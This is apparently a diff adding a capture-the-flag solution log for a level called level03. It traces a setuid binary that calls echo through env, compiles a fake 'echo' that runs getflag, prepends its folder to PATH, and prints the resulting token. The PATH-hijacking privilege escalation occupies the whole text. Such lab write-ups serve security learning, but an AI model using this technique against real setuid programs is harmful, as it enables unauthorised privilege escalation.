@@ -1,0 +1,37 @@
+> ls
+level03
+
+> ltrace ./level03
+__libc_start_main(0x80484a4, 1, 0xbffff7e4, 0x8048510, 0x8048580 <unfinished ...>
+getegid()                                                                             = 2003
+geteuid()                                                                             = 2003
+setresgid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)                                   = 0
+setresuid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)                                   = 0
+system("/usr/bin/env echo Exploit me"Exploit me
+ <unfinished ...>
+--- SIGCHLD (Child exited) ---
+<... system resumed> )                                                                = 0
++++ exited (status 0) +++
+
+
+> mkdir /tmp/aaa
+
+> cd /tmp/aaa
+
+> vim main.c
+#include <stdio.h>
+
+int     main()
+{
+        system("getflag");
+        return (0);
+}
+
+> gcc main.c -o echo
+
+> export PATH=/tmp/aaa:$PATH
+
+> cd -
+
+> ./level03
+Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
